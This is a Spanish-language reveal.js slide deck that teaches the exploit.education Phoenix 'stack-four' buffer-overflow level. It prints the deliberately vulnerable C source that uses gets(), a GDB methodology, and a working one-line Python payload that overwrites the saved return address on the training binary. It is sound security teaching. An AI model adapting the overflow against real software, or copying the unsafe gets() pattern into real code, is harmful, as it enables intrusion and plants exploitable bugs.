@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Stack Four</title>
+<meta name="author" content="Rising Edge - Enrique"/>
+<meta name="description" content=""/>
+<meta name="keywords" content=""/>
+<style type="text/css">
+.underline { text-decoration: underline; }
+</style>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/dracula.css" id="theme"/>
+
+
+<!-- If the query includes 'print-pdf', include the PDF print sheet -->
+<script>
+    if( window.location.search.match( /print-pdf/gi ) ) {
+        var link = document.createElement( 'link' );
+        link.rel = 'stylesheet';
+        link.type = 'text/css';
+        link.href = 'https://cdn.jsdelivr.net/npm/reveal.js/css/print/pdf.css';
+        document.getElementsByTagName( 'head' )[0].appendChild( link );
+    }
+</script>
+</head>
+<body>
+<div class="reveal">
+<div class="slides">
+<section id="sec-title-slide"><h1 class="title">Stack Four</h1><p class="subtitle">Pilas de llamadas y dirección de retorno</p>
+<h2 class="author">Rising Edge - Enrique</h2><h2 class="date">2026-06-10</h2>
+</section>
+<section id="sec-table-of-contents"><div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#/slide-orgeec779c">Recapitulación</a></li>
+<li><a href="#/slide-orgc9448ad">Ejercicio stack-four</a></li>
+<li><a href="#/slide-org9728198">Gracias (:</a></li>
+</ul>
+</div>
+</div>
+</section>
+
+<section>
+<section id="slide-orgeec779c">
+<h2 id="orgeec779c">Recapitulación</h2>
+<ul>
+<li>Desbordes en variables de entorno.</li>
+<li>Sobrescribir apuntadores a funciones.</li>
+
+</ul>
+</section>
+</section>
+<section>
+<section id="slide-orgc9448ad">
+<h2 id="orgc9448ad">Ejercicio stack-four</h2>
+<div class="outline-text-2" id="text-orgc9448ad">
+</div>
+</section>
+<section id="slide-org94ace54">
+<h3 id="org94ace54">Código</h3>
+<div class="org-src-container">
+
+<pre  class="src src-c"   ><code trim><span style="color: #b8a6a9;">/* </span><span style="color: #b8a6a9;">phoenix/stack-four, by https://exploit.education</span><span style="color: #b8a6a9;"> */</span>
+
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;err.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;stdio.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;stdlib.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;string.h&gt;</span>
+<span style="color: #7fbbb3; font-weight: bold;">#include</span> <span style="color: #a7c080;">&lt;unistd.h&gt;</span>
+
+<span style="color: #7fbbb3; font-weight: bold;">#define</span> <span style="color: #7fbbb3;">BANNER</span> \
+  <span style="color: #a7c080;">"Welcome to "</span> LEVELNAME <span style="color: #a7c080;">", brought to you by https://exploit.education"</span>
+
+<span style="color: #e69875;">char</span> *<span style="color: #83c092;">gets</span>(<span style="color: #e69875;">char</span> *);
+
+<span style="color: #e69875;">void</span> <span style="color: #83c092;">complete_level</span>() {
+  printf(<span style="color: #a7c080;">"Congratulations, you've finished "</span> LEVELNAME <span style="color: #a7c080;">" :-) Well done!\n"</span>);
+  exit(0);
+}
+
+<span style="color: #e69875;">void</span> <span style="color: #83c092;">start_level</span>() {
+  <span style="color: #e69875;">char</span> <span style="color: #7fbbb3;">buffer</span>[64];
+  <span style="color: #e69875;">void</span> *<span style="color: #7fbbb3;">ret</span>;
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+  printf(<span style="color: #a7c080;">"and will be returning to %p\n"</span>, ret);
+}
+
+<span style="color: #e69875;">int</span> <span style="color: #83c092;">main</span>(<span style="color: #e69875;">int</span> <span style="color: #7fbbb3;">argc</span>, <span style="color: #e69875;">char</span> **<span style="color: #7fbbb3;">argv</span>) {
+  printf(<span style="color: #a7c080;">"%s\n"</span>, BANNER);
+  start_level();
+}
+</code></pre>
+</div>
+</section>
+<section id="slide-org5f6f602">
+<h3 id="org5f6f602">Objetivo</h3>
+<ul>
+<li class="fragment appear">The aim is to <b>execute</b> the function <b><code>complete_level</code></b> by <b>modifying</b> the
+<b>saved return address</b>, and pointing it to the complete<sub>level</sub>() function.</li>
+
+</ul>
+</section>
+<section id="slide-org5164e32">
+<h3 id="org5164e32">Resumiendo el código&hellip;</h3>
+<ul>
+<li class="fragment appear">¿Qué hay de diferente en el código?</li>
+<li class="fragment appear">¿Qué hace <code>__builtin_return_address</code>?</li>
+
+</ul>
+</section>
+<section id="slide-orge231382">
+<h3 id="orge231382">Teoría</h3>
+<div class="outline-text-3" id="text-orge231382">
+</div>
+</section>
+<section id="slide-org4e9e135">
+<h4 id="org4e9e135">Pila de llamadas (call stack)</h4>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Call_stack">Definición</a></li>
+<li>Son estructuras de datos que contienen información sobre el estado de las
+subrutinas.</li>
+<li>Compuesta por marcos de pila (<i>stack frames</i>, también registros de activación
+o marcos de activación).</li>
+<li>Cada marco de pila corresponde a una invocación de una subrutina que aún no ha
+finalizado con un retorno.</li>
+<li>El <i>stack frame</i> situado en la parte superior de la pila pertenece a la rutina
+que se está ejecutando en ese momento.</li>
+
+</ul>
+</section>
+<section id="slide-org32ce6bd">
+<h4 id="org32ce6bd">Representación de una pila de llamadas</h4>
+
+<div id="orgb19117a" class="figure">
+<p><img src="./img/Call_stack_layout.svg" alt="Call_stack_layout.svg" class="org-svg" />
+</p>
+</div>
+</section>
+<section id="slide-org670145e">
+<h4 id="org670145e">Dirección de retorno (return address)</h4>
+<ul>
+<li class="fragment appear"><a href="https://en.wikipedia.org/wiki/Return_statement">Definición</a></li>
+<li class="fragment appear">La instrucción <code>return</code> hace que la ejecución <b>salga</b> de la <b>subrutina actual</b>
+y se <b>reanude</b> en el <b>punto</b> del código inmediatamente <b>posterior</b> a la
+instrucción que llamó a la subrutina.</li>
+<li class="fragment appear">La rutina que realiza la llamada (<i>caller</i>) guarda la dirección de retorno en
+la pila de llamadas del proceso o un registro.</li>
+
+</ul>
+</section>
+<section id="slide-org2bfc85f">
+<h4 id="org2bfc85f"><code>__builtin_return_address</code></h4>
+<div class="org-src-container">
+
+<pre  class="src src-c"   ><code trim><span style="color: #e69875;">void</span> * <span style="color: #83c092;">__builtin_return_address</span> (<span style="color: #e69875;">unsigned</span> <span style="color: #e69875;">int</span> <span style="color: #7fbbb3;">level</span>)
+</code></pre>
+</div>
+
+<ul>
+<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html">Documentación</a>.</li>
+<li>Retorna la dirección de retorno de la función actual o de uno de los
+<i>callers</i>.</li>
+<li><code>level</code> es el número de marcos de pila a escanear en la pila. 0 devuelve la
+dirección de retorno actual, 1 devuelve la del caller y sucesivamente.</li>
+
+</ul>
+</section>
+<section id="slide-org59ef696">
+<h3 id="org59ef696">Resolviendo stack-four</h3>
+<div class="outline-text-3" id="text-org59ef696">
+</div>
+</section>
+<section id="slide-org06f2d31">
+<h4 id="org06f2d31">Análisis inicial del binario</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash" id="file-stack-one"  ><code trim>file /opt/phoenix/amd64/stack-four
+</code></pre>
+</div>
+</section>
+<section id="slide-orgd47d349">
+<h4 id="orgd47d349">Identificación de medidas de protección</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash" id="checksec-stack-one"  ><code trim>checksec /opt/phoenix/amd64/stack-four
+</code></pre>
+</div>
+</section>
+<section id="slide-orgfcc6baf">
+<h4 id="orgfcc6baf">Metodología para resolver el nivel</h4>
+<ol>
+<li>Ejecutar binario en GDB.</li>
+<li>Identificar función vulnerable y asignar breakpoint.</li>
+<li>Crear <code>hook-stop</code> para analizar la pila del <code>start_level</code>.</li>
+<li>Identificar dirección de retorno en la pila.</li>
+<li>Calcular longitud de bytes necesarios a enviar para sobrescribir la dirección
+de retorno.</li>
+
+</ol>
+</section>
+<section id="slide-org980189c">
+<h4 id="org980189c">Ejecutar GDB</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>gdb -q /opt/phoenix/amd64/stack-four
+</code></pre>
+</div>
+</section>
+<section id="slide-org3798d95">
+<h4 id="org3798d95">Identificar función vulnerable</h4>
+<div class="org-src-container">
+
+<pre  class="src src-GDB"   ><code trim>gef config context.enable 0
+disassemble main
+disassemble start_level
+break *0x400649
+</code></pre>
+</div>
+</section>
+<section id="slide-orgfc3e489">
+<h4 id="orgfc3e489">Analizar con hook</h4>
+<div class="org-src-container">
+
+<pre  class="src src-GDB"   ><code trim>define hook-stop
+info registers
+x/32wx $rsp # pila de 80 bytes
+x/3i $rip
+end
+</code></pre>
+</div>
+</section>
+<section id="slide-orgc1f13e7">
+<h4 id="orgc1f13e7">Calcular <i>padding</i> necesario para llamar <code>complete_level</code></h4>
+<div class="org-src-container">
+
+<pre  class="src src-GDB"   ><code trim>run # pasar 64 A's, buscar dirección de retorno y calcular offset
+continue
+</code></pre>
+</div>
+</section>
+<section id="slide-org45deed5">
+<h4 id="org45deed5">Payload para resolver el nivel</h4>
+<div class="org-src-container">
+
+<pre  class="src src-bash"   ><code trim>python3 -c <span style="color: #a7c080;">'import sys; sys.stdout.buffer.write(b"A"*88 + b"\x1d\x06\x40")'</span> | /opt/phoenix/amd64/stack-four
+</code></pre>
+</div>
+</section>
+</section>
+<section>
+<section id="slide-org9728198">
+<h2 id="org9728198">Gracias (:</h2>
+<ul>
+<li>¿Dudas?</li>
+
+</ul>
+</section>
+</section>
+</div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.js"></script>
+
+<script>
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+Reveal.initialize({
+
+// Optional libraries used to extend on reveal.js
+dependencies: [
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+ { src: 'https://cdn.jsdelivr.net/npm/reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }]
+
+});
+
+</script>
+</body>
+</html>
